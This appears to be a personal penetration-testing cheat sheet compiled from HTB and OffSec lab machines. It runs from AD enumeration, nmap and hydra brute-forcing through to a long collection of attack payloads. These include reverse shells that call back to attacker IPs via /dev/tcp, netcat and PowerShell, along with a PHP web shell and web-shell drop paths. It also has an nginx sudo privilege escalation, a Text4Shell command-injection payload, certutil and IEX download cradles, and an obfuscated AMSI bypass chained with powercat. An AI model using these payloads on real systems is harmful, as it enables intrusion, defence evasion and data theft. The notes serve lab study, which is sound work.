**NT hash**: The NT hash, also known as the NTLM hash, is a more secure way of storing Windows passwords than the LM hash. It uses the MD4 hashing algorithm and does not split the password. It is more resistant to brute-force attacks compared to the LM hash. As an example, `823452073d75b9d1cf70ebdf86c7f98e` is the NT hash of the Administrator's password.

</details>


#### WindapSearch
LDAP related tool - https://github.com/ropnop/windapsearch
Used to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries.
The `--da` (enumerate domain admins group members ) option and the `-PU` ( find privileged users) options. The `-PU` option is interesting because it will perform a recursive search for users with nested group membership.


```
python3 windapsearch.py --dc-ip <DC_IPO_ADD> -u <USER>@<DOMAIN> -p <PASSWD> --da
```


#### ldapsearch - for enumeration

```
ldapsearch -x -H ldap://10.129.101.76 -D 'Ant.Edwards@puppy.htb' -w 'Antman2025!' -b "CN=ADAM D. SILVER,CN=USERS,DC=puppy,DC=htb" userAccountControl -v     # -D = bind user (login), -b = search base (target object), and final args are the attribute to fetch and verbosity - HTB Puppy
```


#### bloodyAD ( for object manipulation and escalation)

```
bloodyAD --host 10.129.101.76 -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac adam.silver -f ACCOUNTDISABLE       # bloodyad -  remove the Flag ACCOUNTDISABLE (enable the account) (HTB Puppy)
```

```
bloodyAD --host 10.129.101.76 -d puppy.htb -u ant.edwards -p 'Antman2025!' set password adam.silver 'Tuesday@2'        # bloodyad - Set Adamas password (HTB Puppy)
```

```
bloodyAD --host "10.129.232.167" -d "tombwatcher" -u "alfred" -p "basketball" add groupMember "infrastructure" "alfred"   # bloodyad - Add a user to a group  (HTB Tombwatcher )
```

## winrm

Windows Remote Management (WinRM)
```
port 5985                                                               # WinRM Default Port: over HTTP (unencrypted).
port 5986                                                               # WinRM Default Port over HTTPS (encrypted with SSL/TLS).
nmap -p 5985,5986 -sV <target_ip>                                       # WinRM basic port scan
curl -v http://<target_ip>:5985/wsman                                   # WinRM - Is it over http , does it accept and verbs ? Is the endpoint up? - To interact with the /wsman endpoint meaningfully, you'll need valid credentials (e.g., a username and password or NTLM hash).
evil-winrm -i <target_ip> -u <username> -p <password>                   # WinRM - Get a shell with creds
netexec winrm 192.168.179.97 -u charlotte -p 'Game2On4.!' -x 'whoami'   # WinRM - Run commands with creds

```

### COnvert passwords to NTLM hashes in bash
```
echo -n 'Summer2025!' | iconv -t UTF-16LE | openssl dgst -md4             # NTLM - Convert a password to NTLM hash in Bash
```


-----

## nmap


## OSCP Starting Recon Methodology
### 1. Initial Nmap Scan (Service and Port Discovery)
```
locate nse | grep shellshock
/usr/share/nmap/scripts/http-shellshock.nse

nmap -v -p- -sC -sV -oA nmap/-p-nmap <IPADDRESS> --open

nmap -sV -sC -oA NmapResults <IPADDRESS>  		                                  # Initital Enum - Versions, defaults scripts , all outputs
nmap --script safe <IPADDRESS> 					                                        # Initital Enum - runs all the "safe" scrpts
nmap --script "vuln and safe" <IPADDRESS> 		                                  # Initital Enum - runs all the "vuln and safe" scrpts
nmap -sS -A -p- -T4 -oN nmap.txt <IPADDRESS> 	                                  # Initital Enum - Hackersploits Nmap
nmap --script-help=SCRIPT_NAME.nse
nmap -sS -p- -T4 <IP_ADDRESS>                                                   # Initital Enum - Scan all ports with SYN scan 
nmap -sV -sC -A <IP_ADDRESS>                                                    # Initital Enum - Detect service versions, OS, and run default NSE scripts
sudo nmap -sn <IP_ADDRESS_RANGE> | grep 'scan report' | cut -d " "  -f5         # Initital Enum - Get just the IPS 
sudo nmap -sn <IP_ADDRESS> | grep -oP "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}       # Initital Enum - Regex where -P is comprehensive regex and -o is  only matching
```
#### Find exploits in nmap scrips
- `grep Exploits /usr/share/nmap/scripts/*.nse`

### 2. Recognizing Port Patterns and Services

### Knowing its a domain controller
**LDAP Port (389)** and **LDAPS Port (636)** are typically open on Domain Controllers DC sync .
```
nmap -p 389,636 <target_network>
telnet <IP_ADDRESS> 389
nltest /dclist:<domain_name>    # PS list out the domain controller
netdom query dc
```

##### Active Directory (Windows Environment)

```
nmap --script ldap-rootdse,ldap-search <IP_ADDRESS>    # Enumerate LDAP information
rpcclient -U "" <IP_ADDRESS>             # Null session for RPC enumeration
enum4linux -a <IP_ADDRESS>               # Enumerate SMB shares and users
nmap --script smb-enum-shares,smb-enum-users -p445 <IP_ADDRESS>   # Nmap SMB enumeration
```

##### Web Servers (Apache, Nginx, IIS)

```
gobuster dir -u http://<IP_ADDRESS> -w /path/to/wordlist.txt -t 50   # Directory brute force
whatweb <IP_ADDRESS>                   # Web server fingerprinting
nmap --script http-enum,http-headers,http-title -p80,443 <IP_ADDRESS>   # HTTP enumeration
```

##### FTP / File Services

```
hydra -l admin -P /path/to/wordlist.txt ftp://<IP_ADDRESS>    # Brute-force FTP login
nmap --script ftp-anon,ftp-bounce,ftp-syst <IP_ADDRESS>   # FTP vulnerability detection
```

##### Database Servers (MySQL, MSSQL, PostgreSQL)
```
nmap --script mysql-info,mysql-users,mysql-databases -p3306 <IP_ADDRESS>   # MySQL enumeration
msfconsole -x "use auxiliary/scanner/mssql/mssql_login; set RHOSTS <IP_ADDRESS>; run"   # MSSQL brute-force
sqlmap -u "http://<IP_ADDRESS>/vulnerable_endpoint" --dbs   # SQL Injection test
```

##### Mail Servers (SMTP, IMAP, POP3)

```
nmap --script smtp-enum-users,smtp-open-relay -p25 <IP_ADDRESS>   # Enumerate SMTP users and open relays
nmap --script imap*
nmap --script pop3*

hydra -l user -P /path/to/wordlist.txt smtp://<IP_ADDRESS>   # Brute-force SMTP login, also pop3 , imap
```
https://donsutherland.org/crib/imap
```
# interact with IMAP Server (Port 143)  - 
nc 192.168.179.140 143                                                          # IMAP Server (Port 143) - Connect with 
A1 LOGIN <username> <password>                                                  # IMAP Server (Port 143) - Login  
A2 LIST "" "*"                                                                  # IMAP Server (Port 143) - List all emails
A3 SELECT INBOX                                                                 # IMAP Server (Port 143) -  select the inbox
A4 FETCH 1:* (BODY[HEADER.FIELDS (DATE FROM SUBJECT)] BODY[TEXT])               # IMAP Server (Port 143)  - see all the emails
A4 FETCH 5 (BODY[1])                                                            # IMAP Server (Port 143)  - Get the main plaintext body of the 5th email. BODY[2] could be the content, BODY[3] could be an attached pdf etc
```

```
# interact with pop3 Server (Port 110 106)  - 
nc 192.168.179.140 110                                  # pop3 Server (Port 110 106) connect with 
USER <username>                                         # pop3 Server (Port 110 106) - Authenticate username
PASS <password>                                         # pop3 Server (Port 110 106) - Authenticate Password
LIST                                                    # pop3 Server (Port 110 106) - List the messages
RETR <message_number>                                   # pop3 Server (Port 110 106) - retrieve the message by number
```

##### RDP (Remote Desktop) default port 3389
```
hydra -l admin -P /path/to/wordlist.txt rdp://<IP_ADDRESS>   # RDP port 3389 - Brute-force RDP login
nmap -p 3389 --script rdp-* -oN RDP-Nmap.txt <IP_ADDRESS>    # RDP port 3389 - nmap scan
sudo netexec rdp -L                                          # RDP port 3389 - List all rdp modules; Likely none though 
rdesktop <IP_ADDRESS>                                        # RDP port 3389 - Might allow a connection . Always try

```

##### Other Ports and Services

```
hydra -l root -P /path/to/wordlist.txt ssh://<IP_ADDRESS>    # Brute-force SSH login
telnet <IP_ADDRESS>   # Test Telnet access
dig axfr @<IP_ADDRESS> domain_name   # DNS zone transfer check
```

### 3. Next Steps After Enumeration
```
searchsploit service_name version   # Search for public exploits
Searchsploit -x <EXPLT-NUMBER>     # print out an exploit to review it
Searchsploit -m <EXPLT-NUMBER>     # Copy the exploit locally
hydra -l user -P /path/to/wordlist.txt service://<IP_ADDRESS>    # Test credentials
burpsuite   # Manual web exploitation
```

### 4. Nmap Specific Commands
```
nmap -sV -sC -oA NmapResults <IP_ADDRESS>   # Scan services, versions, and run default scripts
nmap --script safe <IP_ADDRESS>   # Run "safe" NSE scripts
nmap -sS -A -p- -T4 -oN nmap.txt <IP_ADDRESS>   # Aggressive full-port scan
```

##### Find Exploits in Nmap Scripts
```
grep Exploits /usr/share/nmap/scripts/*.nse    # Search for exploit-related scripts
nmap -sV -p 443 --script "vuln" <IP_ADDRESS>    # Run vulnerability scripts on port 443
nmap --script "discovery and safe" <IP_ADDRESS>   # Combine discovery and safe scripts
```

##### SNMP Enumeration
```
sudo nmap -sU --open -p 161 target_range -oG open-snmp.txt    # SNMP scan on a range of IPs
```

##### LDAP Enumeration
```
nmap -n -sV --script "ldap* and not brute" <IP_ADDRESS>   # LDAP enumeration without brute force
```


# TODO: Powershell when you don't have nmap
```
# Basic
PS C:\Users\student> Test-NetConnection -Port 445 192.168.179.151

# Looped
PS C:\Users\student> 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.179.151", $_)) "TCP port $_ is open"} 2>$null
```


#### Nmap script lister:
```
nmap --script-help=all | grep '^[a-zA-Z0-9-]*$' | grep -v '^$' && echo -e "\nRun CMD:        nmap --script=<CURIOUS>*           : against target"   # nmap/scripts
```   

#### Downloading new NSE scrips and updateing the scripts db

```
# FIRST Download a script from the interenet ( MAKE SURE ITS SAFFE AND LEGIT FIRST)
# Then....
sudo cp <SCRIPT>.nse /usr/share/nmap/scripts/<SCRIPT>.nse
sudo nmap --script-updatedb
```

#### nmap
```
nmap -Pn -sS -D <RESPONSE/LOCAL_IP>,RND:10 <TARGET_IP>          # Stealthy and sneaky nmap ( -D will return to local IP and the ncreate 1 "Decoy" ips so it looks more "normal" ) - nmap Decoy Mode
nmap -Pn -sS -S 8.8.8.8 --spoof-mac 0 --mtu 24 -D <RESPONSE/LOCAL_IP>,RND:10 <TARGET_IP>          #   Even sneakier nmap scan -S will pretend to be from secpfied address
```



### Scan for local ips with bash on port 445

`for i in $(seq 1 254); do nc -zv -w 1 172.16.139.$i 445; done`

----

## Curl
- `curl -v http://<IP_ADDRESS>` # Basic call on a site
- `curl -O 138.68.182.130:30775/download.php` # Download a file with curl
- `curl -I https://www.inlanefreight.com` # Only display the response headers. 
- `curl www.bbc.com --proxy 127.0.0.1:8080`   # Send via a proxy eg Burp
- `curl -T myfile.txt http://192.168.179.180/` transfer a file to the host
- `curl -G 'http://localhost/?' --data-urlencode 'cmd /c C:\\users\\ariah\\desktop\\payload.exe'` # URl encode of request data - Offsec Nickel

## Send and recive from victim to attacker (some ways)
```
cat <SOMELARGE_ZIP> > /dev/tcp/10.10.14.93/9001                                           # Data Transfer / send recieve from victim to attacker - with nc
```

```
nc -lvnp 9001 > <SOMELARGE_ZIP>                                                           # Data Transfer / send recieve from victim to attacker - with nc
```

## Data Transfer / send recieve from victim to attacker
On kali start ssh
```
sudo systemctl start ssh                                                                  # Data Transfer / send recieve from victim to attacker - with ssh
```

On the victim make a new dir, pair of keys and cat the mout 
```
mkdir -p ~/.ssh                                                                           # Data Transfer / send recieve from victim to attacker - with ssh
chmod 700 ~/.ssh                                                                          # Data Transfer / send recieve from victim to attacker - with ssh
ssh-keygen -t ed25519 -N '' -f ~/.ssh/id_ed25519                                          # Data Transfer / send recieve from victim to attacker - with ssh
cat ~/.ssh/id_ed25519.pub                                                                 # Data Transfer / send recieve from victim to attacker - with ssh
```
Copy the key `id_ed25519.pub` the attack side `authroized_keys` file on kali

Next copy the target data from the victim to the Attack machine for ananlysis
```
scp -i ~/.ssh/id_ed25519 /tmp/data.tgz kali@<KALI_IP>:/Destinatin/of/the/files/data       # Data Transfer / send recieve from victim to attacker - with ssh
```

Stop ssh once complete
```
sudo systemctl stop ssh                                                                   # Data Transfer / send recieve from victim to attacker - with ssh
```



## netcat
IF you have an open port y oucan try probeing with netcat
- `nc -zvv <IP_ADDRESS> <PORT>`

```
# TCP Port Scan

nc -nvv -w 1 -z <IP_ADDR> PORT-RANGE                                          # Port scan - Manual: Basic

echo "Hello" | nc -nvv -w 1 -z <IP_ADDR> PORT-RANGE                           # Port scan - Manual: Some Data

echo "GET / HTTP/1.0\r\n\r\n" | nc -nvv -w 1 -z <IP_ADDR> PORT-RANGE          # Port scan - Manual: Protocol specific etc etc 



# UDP Port Scan
nc -nv -u -z -w 1 <IP_ADDR> PORT                                              # Port scan - Manual: UDP responses may not always come back,
```


### Powercat

[Powercat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1) is a powershell script that does what Netcat does. This is better becasue its native to windows (psq) 
`cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 . `

Dodgy Short Cut for cradele to RevShell
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.179.3:8000/powercat.ps1');powercat -c 192.168.179.163 -p 9999 -e powershell"
```




-------





### Nginx Prvesc
htb Broker 
IF nginx is permited to run with `sudo` use the [ngx_http_dav_module](http://nginx.org/en/docs/http/ngx_http_dav_module.html) to write our
public SSH key into the root user's authorized_keys file. 
To do so, we start by creating the malicious NGINX configuration file, which looks as follows:

```
user root;                  # run it as root
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
    server {
        listen 1337;
        root /;             # set the root file system as the servers topmost dir, (so the entire file system!)
        autoindex on;
    
        dav_methods PUT;    # allow webdav ( Audit and versioning ) with PUT so files ( new root user keys) can be written to the server
    }
}
```

The key parts are the following:
- `user root` : The worker processes will be run by root , meaning when we eventually upload a file, it will also be owned by root .
- `root /` : The document root will be topmost directory of the filesystem.
- `dav_methods PUT` : We enable the WebDAV HTTP extension with the PUT method, which allows clients to upload files.

Save the settings to a file and get nginx to use it `sudo nginx -c /tmp/pwn.conf`. 
You can test the configuration with `-t` as in `sudo nginx -t /tmp/pwn.conf`
Once we run the nginx server we can then curl any file by supplying th epath eg: `curl localhost:1337/etc/passwd`. 
The final step to get a shell is to write our public SSH key to `/root/.ssh/authorized_keys`. This is where the `dav_methods PUT` comes in.

```sh
activemq@broker:/tmp$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/activemq/.ssh/id_rsa): ./root
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in ./root
Your public key has been saved in ./root.pub
...
...
```

The private key is stored in the file called `root` , and the public key is found in `root.pub` .
Finally, we use cURL to send the PUT request that will write the file. Having set the document root
to / , we specify the full path `/root/.ssh/authorized_keys` and use the `-d` flag to set thef
contents of the written file to our public key.

- `curl -X PUT localhost:1337/root/.ssh/authorized_keys -d "$(cat root.pub)"`

The request should go through without error. We can now ssh into the machine as the root user: `ssh -i root root@localhost`

An alternative approach would be to load up a cron with the following cotnent:
```
* * * * * bash -c 'bash -i >& /dev/tcp/10.10.14.8/9001 0>&1'
``` 
To file to `/var/spool/cron/crontabs/root` with `curl <TARGET-NGINX-IP>:9001/var/spool/cron/crontabs/root/ --upload-file nastyCron`

### Password spray 

```sh
#/bin/bash
do_sray()(
    # quieter if someone looks at what bnaries ae being run
    users=$(awk -F: '{ if ($NF ~ /sh$/) print $1}' /etc/passwd)
    for user in $users; do
        echo "$1" | timeout 2 su $users -c whoami 2>/dev/null
        
        # exit if the code of the last comand is 0 ( succsess)
        if [[ $? -eq 0 ]]; then
            return
        fi
    done
)
do_spray $1

# This fucntion could be copies into bash and not to a script so it is not written to disk. IT is then called with "dospray <POSSIBLE_PW>"

```
Best in bash becasue no dependencies like  C based tool `sucrack` 

### reaver - Tool to attack WPS

- `reaver -i mon0 -b 02:00:00:00:00:00 -vv -c 1` 


---

# Shells

## PHP shell
Note: IF we can run and upload the following file, and then go to the page we have code execution - `echo "<?php phpinfo(); ?>" > test.php`
 HTB Tiers2 ( Base). Making use of the `$_REQUEST` method to fetch the cmd parameter because it works for fetching
both URL parameters in GET requests and HTTP request body parameters in case of POST requests.
Furthermore, we also use a POST request later in the walkthrough, thus using the `$_REQUEST` method is the
most effective way to fetch the cmd parameter in this context, so a basic CMD: `<?php echo system($_REQUEST['cmd']);?>`

One good option for PHP is [phpbash](https://github.com/Arrexel/phpbash), which provides a terminal-like, semi-interactive web shell.

Furthermore, [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) provides a plethora of web shells for different frameworks and languages

## WebShells

Loads - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx



### Windows based location for a webshell


**IIS (Microsoft Internet Information Services)**

```
Default site:
  C:\inetpub\wwwroot\                                                           # windows based - Web shell / reverse shell locations

Other common locations:
  C:\inetpub\wwwroot\<site_name>\                                               # windows based - Web shell / reverse shell locations
  C:\inetpub\vhosts\<site_name>\         # Plesk / hosting panels               # windows based - Web shell / reverse shell locations
  D:\Websites\<site_name>\               # admins often move sites off C:       # windows based - Web shell / reverse shell locations
  D:\inetpub\wwwroot\                    # alt drive                            # windows based - Web shell / reverse shell locations

Per-user IIS Express (dev environments):
  C:\Users\<user>\Documents\IISExpress\                                         # windows based - Web shell / reverse shell locations

Where to confirm:
  - Check: %windir%\System32\inetsrv\config\applicationHost.config
    (look for <site> entries with physicalPath="...")

Typical PHP entry points on IIS:
  C:\inetpub\wwwroot\*.php                                                      # windows based - Web shell / reverse shell locations
  C:\inetpub\wwwroot\<app>\index.php                                            # windows based - Web shell / reverse shell locations
  C:\inetpub\wwwroot\<app>\uploads\*.php  (if upload vuln)                      # windows based - Web shell / reverse shell locations
```

**Apache on Windows (generic / manual install)**
```
Very common defaults:
  C:\Apache24\htdocs\                                                           # windows based - Web shell / reverse shell locations
  C:\Program Files\Apache Group\Apache2\htdocs\                                 # windows based - Web shell / reverse shell locations
  C:\Program Files\Apache24\htdocs\                                             # windows based - Web shell / reverse shell locations
  C:\Program Files (x86)\Apache Group\Apache2\htdocs\                           # windows based - Web shell / reverse shell locations

Sometimes moved to:
  D:\www\                                                                       # windows based - Web shell / reverse shell locations
  D:\webroot\                                                                   # windows based - Web shell / reverse shell locations
  D:\htdocs\                                                                    # windows based - Web shell / reverse shell locations

Where to confirm:
  - apache\conf\httpd.conf:
      DocumentRoot "C:/Apache24/htdocs"
      <Directory "C:/Apache24/htdocs">

VirtualHosts:
  - apache\conf\extra\httpd-vhosts.conf (per-vhost DocumentRoot)
```

**XAMPP (Apache + PHP on Windows)**
```
Classic defaults:
  C:\xampp\htdocs\                                                              # windows based - Web shell / reverse shell locations
  C:\xampp\apache\htdocs\        # usually same as above                        # windows based - Web shell / reverse shell locations

Per-project:
  C:\xampp\htdocs\<project>\                                                    # windows based - Web shell / reverse shell locations

Where to confirm:
  C:\xampp\apache\conf\httpd.conf                                               # windows based - Web shell / reverse shell locations
  C:\xampp\apache\conf\extra\httpd-vhosts.conf                                  # windows based - Web shell / reverse shell locations

Interesting app subdirs for shells (once in htdocs):
  C:\xampp\htdocs\<app>\uploads\                                                # windows based - Web shell / reverse shell locations
  C:\xampp\htdocs\<app>\images\                                                 # windows based - Web shell / reverse shell locations
  C:\xampp\htdocs\<app>\wp-content\uploads\                                     # windows based - Web shell / reverse shell locations
```

**WampServer (Apache + MySQL + PHP)**
```
64-bit default:
  C:\wamp64\www\                                                                # windows based - Web shell / reverse shell locations

32-bit / older:
  C:\wamp\www\                                                                  # windows based - Web shell / reverse shell locations

Per-project:
  C:\wamp64\www\<project>\                                                      # windows based - Web shell / reverse shell locations

Where to confirm:
  C:\wamp64\bin\apache\apache*\conf\httpd.conf                                  # windows based - Web shell / reverse shell locations
  (check DocumentRoot / <Directory>)
```

**Laragon**
```
Default:
  C:\laragon\www\                                                               # windows based - Web shell / reverse shell locations

Per-project:
  C:\laragon\www\<project>\                                                     # windows based - Web shell / reverse shell locations

Where to confirm:
  C:\laragon\bin\apache\httpd.conf                                              # windows based - Web shell / reverse shell locations
  C:\laragon\bin\nginx\conf\nginx.conf                                          # windows based - Web shell / reverse shell locations
```

**AMPPS**
```
Common defaults:
  C:\Program Files (x86)\Ampps\www\                                             # windows based - Web shell / reverse shell locations
  C:\Program Files\Ampps\www\                                                   # windows based - Web shell / reverse shell locations

Per-project:
  C:\Program Files (x86)\Ampps\www\<project>\                                   # windows based - Web shell / reverse shell locations
```

**EasyPHP / Devserver**
```
Typical:
  C:\Program Files (x86)\EasyPHP-Devserver\eds-www\                             # windows based - Web shell / reverse shell locations
  C:\EasyPHP-Devserver\eds-www\                                                 # windows based - Web shell / reverse shell locations

Per-project:
  ...\eds-www\<project>\
```

**Nginx on Windows (with PHP-FastCGI)**

```
Common:
  C:\nginx\html\                                                                # windows based - Web shell / reverse shell locations
  C:\Program Files\nginx\html\                                                  # windows based - Web shell / reverse shell locations

Sometimes moved:
  D:\nginx\html\                                                                # windows based - Web shell / reverse shell locations
  D:\webroot\                                                                   # windows based - Web shell / reverse shell locations

Where to confirm:
  conf\nginx.conf
    root   html;
    root   D:/webroot;
```

**Framework / CMS Upload Hotspots (once you know the webroot)**

Within <webroot> (whatever that is on Windows):

```
WordPress:
  <webroot>\wp-content\uploads\
  <webroot>\wp-content\themes\<theme_name>\
  <webroot>\wp-content\plugins\<plugin_name>\

Joomla:
  <webroot>\images\
  <webroot>\tmp\
  <webroot>\administrator\components\

Drupal:
  <webroot>\sites\default\files\
  <webroot>\sites\default\files\php\
  <webroot>\modules\custom\<module>\

Generic "developer dumps files here":
  <webroot>\uploads\
  <webroot>\upload\
  <webroot>\files\
  <webroot>\images\
  <webroot>\backup\
  <webroot>\old\
  <webroot>\test\
```

---



### Reverese shell

While reverse shells are always preferred over web shells, as they provide the most interactive method for controlling the compromised server, they may not always work, and we may have to rely on web shells instead. This can be for several reasons, like having a firewall on the back-end network that prevents outgoing connections or if the web server disables the necessary functions to initiate a connection back to us.

One reliable reverse shell for PHP is [the pentestmonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Furthermore, the same [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)  also contains reverse shell scripts for various languages and web frameworks.

Reverse shell wisdom - Somtimes the reverse shell may only call back to a port which is sympathietic with the fire wall etc eg / BRaterina only reveresed back to open port 445 

Reverse shell Generator tool - https://www.revshells.com/  


#### "Serve and Fetch" with base 64 encodeing method ( htb Cozyhosting)
Locally make a shell:
- `echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.49/4444 0>&1' > rev.sh
- IN the target Command injection parameter get he shell and the run it: `admin;curl${IFS}http://10.10.14.22:9001/rev.sh|bash`
- Of do a stright rev shell as base64 after clearing out all the special chars:
  - `;{echo,-n,YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjIvOTAwMSAwPiYK}|{base64,-d}|bash;` 
  - Note: take the time to make the base64 alpha numeric only
  - Note: Bash at the end should not be in braces

##### From the htb Validation machine on the sql injection via php Country param
1. payload =`cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.40/4444 0>&1'`
1. payload =`cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.40/4444+0>%261'`

#### Staged vs Stageless reverseshell payloads
- `Staged Reverse Shell` - The initial payload sent to the target is smaller and essentially acts as a "stager". 
- `Stageless Reverse Shell` - Sends the entire payload in one go, without needing a second stage to be downloaded.


#### Ippsecs preferred 1st attempt Reverse shell ( htb buff)
- `/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1`
  - Edit it to call back to your nc listener on port eg `9001` 
- Serve it up locally via python server 
- To obtain it on the victim run - `powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.142:8000/rev.ps1')"`
- You should see your shell com back to your nc listener `9001`

#### Alt Shell with netcat 
- `locate nc.exe` 
- `cp /usr/share/sqlninja/apps/nc.exe www`
- Open a local server : `python3 -m http.server` defaults to port `8000`
- Download `nc.exe` to the victim machine from the attacker server `curl 10.10.14.106:8000/nc.exe -o nc.exe`
- From the victim send a powershell reverese shell to the nc listener
  - `nc.exe 10.10.14.106 9001 -e powershell`

Encodeing some payloads ( eg Text4shell on OSCP B)

```sh
# Working payload - Partially Percent encoded
http://192.168.179.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec('busybox%20nc%20192.168.179.211%204444%20-e%20sh')%7D")   

# clean payload - Unencoded
http://192.168.179.150:8080/search?query=${script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc 192.168.179.211 4444 -e sh')}")                      

# Payload  run through cyber chef URL encoding including special chars
http://192.168.179.150:8080/search?query=$%7Bscript:javascript:java.lang.Runtime.getRuntime().exec('busybox%20nc%20192.168.179.211%204444%20-e%20sh')%7D%22)      
``` 



#### Encoded Powershell command to dl a reverse shell script , and spawn rev shell (evasive)

Steps
1. Download the encoder script tool `git clone https://github.com/darkoperator/powershell_scripts.git`
2. Echo the reverse shell command to fetch your reverse shell into a script `echo "IEX (New-Object Net.WebClient).DownloadString('http://<KALI-IP>:<PORT>/shell.ps1')" > tmp.ps1`
3. Encode the script which contains the command to get the reverse shell: `python3 ps_encoder.py -s tmp.ps1` This is a `bs64` cmd
4. Set up a listener 
5. Create a local Reverse shell script `shell.ps1`
```ps
$client = New-Object System.Net.Sockets.TCPClient('<KALI-IP>', <PORT>);
$stream = $client.GetStream();
[byte[]]$buffer = 0..65535|%{0};
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```
As a 1-liner
```ps
$client = New-Object System.Net.Sockets.TCPClient('<KALI-IP>', <PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
3. Host the script `python3 -m http.server <PORT>`
4. On the victim, run the powershell which includes the encoded command to download the script `bs64` cmd: `powershell.exe -encodedCommand  <BASE^$_BLOB>`/ Like : `powershell.exe -encodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANgA0ADoAOAAwADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQAKAA==`
5. This will run the encoded command , you will see your reverse shell script get downloaded from your python server, and then you should see a shell appear on your netcat listener.





#### Alternative to get the script is with certutil via the cmd shell
```
certutil -urlcache -f http://192.168.179.214:8000/shell.ps1 shell.ps1

certutil -urlcache -split -f http://192.168.179.214:8000/FILE.ps1 C:\Windows\tasks\FILE.ps1
```
#### Web Craddle (reverse shell)
When you can get command injection but the server doesn't like some special chars , and you want RCE.
1. Payload `curl <IP_ADDRESS:8001> | bash"`
1. Make an html file for your local server which has the line `/bin/bash -c 'bash -i >& /dev/tcp/IP_ADDRESS/9999 0>&1'`
1. server the file up with python `python3 -m http.server 8001` and when that gets curl'd it will send the string in the html file ( the payload)
1. open a net cat listener `nc -lvnp 9999`
IF this doesn't wotrl then we would try to write hte curl output t oan out file and then execute it ( becasue the pipe char did not work) see htb PC

#### Powershell reverse shell snippets - Set up, Payload, file encode , ready to utilise eg impacket

```sh
C:\wamp\www>where powershell     # is powershell installed ?? 

Powershell reverse shell cmd >>:: $client = New-Object System.Net.Sockets.TCPClient('<KALI-IP>', <PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
cat rev.ps1 | iconv -t UTF-16LE | base64 -w 0 # Powershell reverse shell b64 LE output
powershell -enc JABjAGwAaQ...     # Powershell reverse shell - might need (")

```

#### 1 liner Reverse shell for AD with B64 payload
```sh
# 1 liner Reverse shell for AD - Triple command: Disables Defender, Gets Powercat, opens a reverse powercat reverese shell - 1 liner Reverse shell for AD
PS:>  $Text = '[Ref].Assembly.GetType("System.Management.Automation."+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),"NonPublic,Static").SetValue($null,$true); IEX(New-Object System.Net.WebClient).DownloadString("http://<HACKER-SERVER>/powercat.ps1");powercat -c <LISTENER> -p 9999 -e cmd.exe'   # 1 liner Reverse shell for AD Assign our triple command to a variable 
PS:> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)                         # 1 liner Reverse shell for AD - Convert the variable to Bytes
PS:> $EncodedText = [Convert]::ToBase64String($Bytes)                                 # 1 liner Reverse shell for AD - Encode the Bytes to Base64
PS:> $EncodedText                                                                     # 1 liner Reverse shell for AD - Get the encoded String BLOB
C:> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc <B64-BLOB>         # 1 liner Reverse shell for AD - cmd Run the encoded String BLOB if you need to
